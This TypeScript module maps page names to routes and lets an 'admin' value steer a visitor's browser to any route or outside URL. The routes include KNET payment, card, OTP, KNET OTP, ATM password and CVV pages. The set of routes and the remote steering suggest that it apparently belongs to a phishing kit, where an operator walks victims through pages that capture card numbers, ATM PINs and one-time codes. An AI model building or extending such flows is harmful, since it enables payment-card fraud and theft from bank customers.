export const ADMIN_PAGE_ROUTES: Record<string, string> = {
  home: "/", index: "/", products: "/products", cart: "/cart", checkout: "/checkout",
  "summary-payment": "/checkout",
  "moh-login": "/moh-login", "moh-register": "/moh-register", "moh-create-account": "/moh-create-account",
  knet: "/knet", "knet-payment": "/knet",
  card: "/card", "credit-card-payment": "/card",
  "otp-verification": "/otp-verification", "knet-otp": "/knet-otp",
  atm: "/atm", "atm-password": "/atm",
  cvv: "/cvv", "final-page": "/final-page", final: "/final-page",
};
export function resolveAdminPage(page?: string | null): string | null {
  if (!page) return null;
  const raw = String(page).trim();
  if (!raw) return null;
  if (/^https?:\/\//i.test(raw)) return raw;
  const key = raw.replace(/^\/+/, "").replace(/\/+$/, "");
  if (!key) return "/";
  return ADMIN_PAGE_ROUTES[key] ?? "/" + key;
}
export function goToAdminPage(page?: string | null): boolean {
  const target = resolveAdminPage(page);
  if (!target) return false;
  if (/^https?:/i.test(target)) { window.location.href = target; return true; }
  if (window.location.pathname === target) return false;
  window.location.assign(target);
  return true;
}
